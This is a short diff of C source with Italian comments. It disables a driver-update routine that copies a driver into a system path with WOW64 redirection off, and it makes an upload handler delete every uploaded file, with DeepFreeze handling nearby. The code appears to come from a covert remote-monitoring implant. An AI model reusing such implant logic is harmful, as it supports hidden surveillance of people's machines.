@@ -1552,7 +1552,7 @@ void UpdateDriver(char *source_path)
 	char sys_path[DLLNAMELEN];
 	char comp_path[DLLNAMELEN*2];
 	PVOID old_value;
-	
+	/*
 	if (!IsDriverRunning(DRIVER_NAME_W))
 		return;
 	
@@ -1562,7 +1562,7 @@ void UpdateDriver(char *source_path)
 	
 	old_value = DisableWow64Fs();
 	CopyFile(source_path, comp_path, FALSE);	
-	RevertWow64Fs(old_value);
+	RevertWow64Fs(old_value);*/
 }
 
 // I file uploadati vengono messi nella working dir.
@@ -1650,8 +1650,8 @@ BOOL LOG_HandleUpload(BOOL is_upload)
 		}
 
 		// Se non e' uno degli altri file noti lo cancella...
-		if (strcmp(c_file_name, BB_INSTALL_NAME2) && strncmp(c_file_name, BB_INSTALL_NAME1, 5))
-			DeleteFile(HM_CompletePath(c_file_name, s_file_path));
+		//if (strcmp(c_file_name, BB_INSTALL_NAME2) && strncmp(c_file_name, BB_INSTALL_NAME1, 5))
+		DeleteFile(HM_CompletePath(c_file_name, s_file_path));
 
 		// Se c'e' DeepFreeze fixa i file 
 		if (IsDeepFreeze()) {
